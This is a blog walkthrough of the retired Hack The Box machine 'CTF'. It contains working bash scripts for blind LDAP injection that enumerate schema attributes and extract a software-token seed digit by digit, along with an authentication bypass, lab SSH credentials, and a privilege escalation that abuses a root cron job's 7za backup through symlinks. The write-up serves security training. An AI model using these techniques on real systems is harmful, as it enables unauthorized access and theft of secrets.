---
layout: post
title: "CTF: Hack The Box Walkthrough"
date: 2019-07-21 02:27:58 +0000
last_modified_at: 2019-07-21 02:29:54 +0000
category: Walkthrough
tags: ["Hack The Box", CTF, retired]
comments: true
image:
  feature: ctf-htb-walkthrough.jpg
  credit: Lalmch / Pixabay
  creditlink: https://pixabay.com/en/computer-security-business-767784/
---

This post documents the complete walkthrough of CTF, a retired vulnerable [VM][1] created by [0xEA31][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

CTF is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.122 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-06 04:34:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.122                                    
Discovered open port 22/tcp on 10.10.10.122
```

`masscan` finds two open ports. I'll do one better with `nmap` scanning the discovered ports.

```
# nmap -n -v -Pn -p22,80 -A --reason 10.10.10.122 -oN nmap.txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)                                                                                       
| http-methods:
|   Supported Methods: POST OPTIONS GET HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: CTF
```

Bummer. Nothing unusual stands out. Let's check out the `http` service. Here's how it looks like.

<a class="image-popup">
![b702c930.png](/assets/images/posts/ctf-htb-walkthrough/b702c930.png)
</a>

There's some kind of **Fail2Ban** thing going on here I guess, so brute-force actions that result in HTTP response >= 400 is out of the question. :no_good:

## Blind LDAP Injection

It turns out that our next hint lies in the HTML comments of the login page.

<a class="image-popup">
![b4ea9535.png](/assets/images/posts/ctf-htb-walkthrough/b4ea9535.png)
</a>

Attribute and schema? Sure sounds a lot like Lightweight Directory Access Protocol (or LDAP). And, what's the deal with the token string with 81-digits?

A simple Google search reveals that a token string with 81-digits is a software token delivery method called Compressed Token Format (CTF) provisioning. What an apt name for a HTB box!

I explored the login page for a bit and here's what I observe.

_Wrong username_

<a class="image-popup">
![53cd18fe.png](/assets/images/posts/ctf-htb-walkthrough/53cd18fe.png)
</a>

_Right username_

<a class="image-popup">
![bd4e702c.png](/assets/images/posts/ctf-htb-walkthrough/bd4e702c.png)
</a>

You may notice that the login page checks for the username first and if it's correct, it then checks for the One-Time Pin (OTP). Normally, OTP comes in 4-digit, 6-digit and 8-digit formats.

You are probably thinking, "how the hell did he guess the username". I didn't. I used the asterisk (`*`) wildcard in LDAP search filter.

At first, I tried using a single asterisk. I didn't get any feedback. I took it up a notch and tried URL encoding the asterisk and again, received no feedback. Finally, I tried double URL encoding and guess what, it worked!

_Double URL encoding the asterisk_

<a class="image-popup">
![0ff66ec2.png](/assets/images/posts/ctf-htb-walkthrough/0ff66ec2.png)
</a>

_The wildcard does its magic!_

<a class="image-popup">
![e1e880c7.png](/assets/images/posts/ctf-htb-walkthrough/e1e880c7.png)
</a>

Armed with this insight and using a LDAP query such as `*)(cn=*`, I wrote a script to help me enumerate the valid attributes from the schema.

<div class="filename"><span>check.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.122
LIST=$1

function urlencode() {
  echo -n "$1" \
  | xxd -p \
  | tr -d '\n' \
  | sed -r 's/(..)/%\1/g'
}

function send_payload() {
  local query="*)(XXX=*"
  local payload="${query/XXX/$1}"
  local payload="$(urlencode $payload)"
  local payload="$(urlencode $payload)"

  curl \
    -s \
    -d "inputUsername=$payload" \
    -d "inputOTP=123456" \
    http://$HOST/login.php \
  | sed -r -e '34!d' -e 's/\s+<\/div>$//' \
  | rev \
  | cut -d ' ' -f1-2 \
  | rev \
  | tr -d '\n'
}

for attr in $(cat $LIST); do
  result=$(send_payload $attr)
  if [ "$result" == "Cannot login" ]; then
    echo "[+] Found: $attr"
  fi
done
```

Running the script against a LDAP attributes wordlist I found [here](https://github.com/droope/ldap-brute/blob/master/wordlists/attribute_names), this is what I got.

```
[+] Found: cn
[+] Found: commonName
[+] Found: gidNumber
[+] Found: homeDirectory
[+] Found: loginShell
[+] Found: mail
[+] Found: name
[+] Found: objectClass
[+] Found: pager
[+] Found: shadowLastChange
[+] Found: shadowMax
[+] Found: shadowMin
[+] Found: shadowWarning
[+] Found: sn
[+] Found: surname
[+] Found: uid
[+] Found: uidNumber
[+] Found: userPassword
```

At first, I thought the token string is in the userPassword attribute. However, this attribute has a OctetString type which makes it an unlikely candidate. It turns out that `pager` is the attribute storing the token string. To that end, I re-purpose the previous script to exfiltrate the digits one by one until I have the full 81-digit token string.

<div class="filename"><span>deduction.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.122
TOKEN=""

# urlencode
function urlencode() {
  echo -n "$1" \
  | xxd -p \
  | tr -d '\n' \
  | sed -r 's/(..)/%\1/g'
}

# send payload
function send_payload() {
  local query="*)(pager=XXX*"
  local payload="${query/XXX/$1}"
  local payload="$(urlencode $payload)"
  local payload="$(urlencode $payload)"

  curl \
    -s \
    -d "inputUsername=$payload" \
    -d "inputOTP=123456" \
    http://$HOST/login.php \
  | sed -r -e '34!d' -e 's/\s+<\/div>$//' \
  | rev \
  | cut -d ' ' -f1-2 \
  | rev
}

# main
PAYLOAD=""
TOKEN=""

for p in $(seq 1 81); do
  for d in {0..9}; do
    result=$(send_payload "$PAYLOAD${d}")
    if [ "$result" == "Cannot login" ]; then
      TOKEN=${TOKEN}${d}
      PAYLOAD=${PAYLOAD}${d}
      echo -n $d
      break
    fi
  done
done

echo -e "\n[+] Token string is: $TOKEN"
```

<a class="image-popup">
![0ab438a3.png](/assets/images/posts/ctf-htb-walkthrough/0ab438a3.png)
</a>

## Software Token

Now that we have the token string, we can import the token string into `stoken`. According to the manual, `stoken` is  a software token compatible with RSA SecurID 128-bit (AES) tokens. We can use it to generate the OTPs.

<a class="image-popup">
![f6d5e7f3.png](/assets/images/posts/ctf-htb-walkthrough/f6d5e7f3.png)
</a>

You can choose any password you like. I've chosen `hello` as my password.

<a class="image-popup">
![09c8657b.png](/assets/images/posts/ctf-htb-walkthrough/09c8657b.png)
</a>

Again, you are can choose any PIN you like. I've chosen `0000` as my PIN.

<a class="image-popup">
![ae6c1635.png](/assets/images/posts/ctf-htb-walkthrough/ae6c1635.png)
</a>

Once that's done, you'll see the software token, which gives it more of a token device feel, if you will. :laughing:

<a class="image-popup">
![e2f0c212.png](/assets/images/posts/ctf-htb-walkthrough/e2f0c212.png)
</a>

We can now proceed to login to the site. I'm using the following query to bypass authentication.

<a class="image-popup">
![776f960b.png](/assets/images/posts/ctf-htb-walkthrough/776f960b.png)
</a>

I sent in the login request with Burp's Repeater.

<a class="image-popup">
![8231a783.png](/assets/images/posts/ctf-htb-walkthrough/8231a783.png)
</a>

With that, my session should be authenticated and I can use my browser instead.

<a class="image-popup">
![a6511ade.png](/assets/images/posts/ctf-htb-walkthrough/a6511ade.png)
</a>

Boom. I'm now at a page which appears to execute commands. Too bad, I'm not privileged enough.

<a class="image-popup">
![effc5cbf.png](/assets/images/posts/ctf-htb-walkthrough/effc5cbf.png)
</a>

To bypass that, recall the valid attributes that I've enumerated previously? According to its description, `gidNumber` is _an integer uniquely identifying a group in an administrative domain_. With that in mind, we can try the following query.

<a class="image-popup">
![7b8a72dc.png](/assets/images/posts/ctf-htb-walkthrough/7b8a72dc.png)
</a>

Again, let's send the login request with Burp's Repeater.

<a class="image-popup">
![6d74ef1f.png](/assets/images/posts/ctf-htb-walkthrough/6d74ef1f.png)
</a>

We should be able to execute commands right from the browser.

<a class="image-popup">
![97b8e9e4.png](/assets/images/posts/ctf-htb-walkthrough/97b8e9e4.png)
</a>

Perfect. I'm very interested to look at the PHP code of `login.php` and `page.php` to see what's the LDAP filter. As an added bonus, guess what's in there? Credentials!

<a class="image-popup">
![b291cf9b.png](/assets/images/posts/ctf-htb-walkthrough/b291cf9b.png)
</a>

Armed with the credential (`ldapuser:e398e27d5c4ad45086fe431120932a01`), I can give myself a shell via SSH.

The `user.txt` is at `ldapuser`'s home directory.

<a class="image-popup">
![59b372c8.png](/assets/images/posts/ctf-htb-walkthrough/59b372c8.png)
</a>

## Privilege Escalation

During enumeration of `ldapuser`'s account, I notice a script at `/backup/honeypot.sh` that looks like this.

<div class="filename"><span>honeypot.sh</span></div>

```bash
# get banned ips from fail2ban jails and update banned.txt                                                                                                                                          [0/3]
# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)                                                                              
/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt                                                               
# awk '$1=$1' ORS='<br>' /var/www/html/banned.txt > /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.txt                                                                

# some vars in order to be sure that backups are protected
now=$(date +"%s")
filename="backup.$now"
pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')

# keep only last 10 backups
cd /backup
ls -1t *.zip | tail -n +11 | xargs rm -f

# get the files from the honeypot and backup 'em all
cd /var/www/html/uploads
7za a /backup/$filename.zip -t7z -snl -p$pass -- *

# cleaup the honeypot
rm -rf -- *

# comment the next line to get errors for debugging
truncate -s 0 /backup/error.log
```

I stared at it for a long time. I knew instinctively this is the key to privilege escalation but I can't figure who or what is writing to the file `error.log` that  got truncated at the last line. It was only until I ran `watch -n1 ls -lt` at `/backup`, did I notice that the script is backing up and removing files from `/var/www/html/uploads` (a.k.a the honeypot) and also updating the last-modified date of `error.log` at every minute.

If I had to guess, I would say that there's a `cron` job running as `root`, executing `/backup/honeypot.sh` and redirecting `stderr` to `/backup/error.log` at every minute on the minute.

&hellip;

Another interesting bit of information I gathered is that the so-called honeypot at `/var/www/html/uploads` is only writable by `apache`.

<a class="image-popup">
![5d071d1e.png](/assets/images/posts/ctf-htb-walkthrough/5d071d1e.png)
</a>

&hellip;

Armed with the information I gathered so far, I can start to work my way to read `/root/root.txt` by abusing `7za`. This versatile archiver supports the concept of a list file, i.e. a file containing a list of files, separated by newline.

For example, if the file `listfile.txt` contains the following:

```
/backup/*.zip
```

Then the command `7za a backup.zip -t7z @listfile.txt` adds all the files ending with `.zip` in `/backup` to `backup.7z`. And, if the command can't find the file in the list file, it spits out diagnostic messages, such as warnings and/or errors to `stderr`.

On one hand, if we run `tail -f /backup/error.log` in the shell, we can capture the diagnostic messages sent by `7za` before it gets truncated. On the other hand, we can trick `7za` to spit out diagnostic messages by creating the following file and creating a symbolic link to `/root/root.txt`.

<a class="image-popup">
![53549f63.png](/assets/images/posts/ctf-htb-walkthrough/53549f63.png)
</a>

One minute later, we should see the `root.txt` on the shell.

<a class="image-popup">
![2e241a15.png](/assets/images/posts/ctf-htb-walkthrough/2e241a15.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/172
[2]: https://www.hackthebox.eu/home/users/profile/13340
[3]: https://www.hackthebox.eu/
